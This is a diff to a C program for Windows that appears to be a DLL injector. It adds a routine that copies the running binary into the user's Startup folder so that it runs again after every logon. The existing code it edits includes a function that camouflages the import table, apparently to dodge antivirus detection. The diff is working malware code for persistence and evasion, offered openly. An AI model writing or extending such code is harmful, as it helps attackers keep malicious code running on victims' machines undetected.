@@ -1,6 +1,46 @@
 #include <stdio.h>
 #include <Windows.h>
 #include <tlhelp32.h>
+#include <shlobj.h>
+#include <strsafe.h>
+
+// Function to move the current running binary to the startup folder
+BOOL MoveToStartup() {
+    wchar_t szStartupPath[MAX_PATH];
+    wchar_t szCurrentPath[MAX_PATH];
+    wchar_t szNewPath[MAX_PATH];
+
+    // Get the path of the startup folder
+    if (FAILED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
+        printf("[!] SHGetFolderPath Failed With Error Code: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    // Get the current location of the binary
+    DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
+    if (length == 0) {
+        printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    // Construct the new path in the startup folder
+    wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
+    if (lastSlash != NULL) {
+        StringCchPrintf(szNewPath, MAX_PATH, L"%s%s", szStartupPath, lastSlash);
+    } else {
+        printf("[!] Failed to construct new path\n");
+        return FALSE;
+    }
+
+    // Copy the binary to the startup folder
+    if (!CopyFile(szCurrentPath, szNewPath, FALSE)) {
+        printf("[!] CopyFile Failed With Error Code: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    printf("[+] Successfully moved the binary to the startup folder\n");
+    return TRUE;
+}
 
 // Function to add Whitelisted APIs to camouflage IAT
 VOID IATCamoflage2() {
@@ -188,6 +228,12 @@ int main() {
 
 	// Camoflage the IAT
 	IATCamoflage2();
+
+	// Move the binary to the startup folder
+	if (!MoveToStartup()) {
+		printf("[!] Failed to move the binary to the startup folder\n");
+		return -1;
+	}
 
 	printf("[+] DLL injected successfully\n");
 
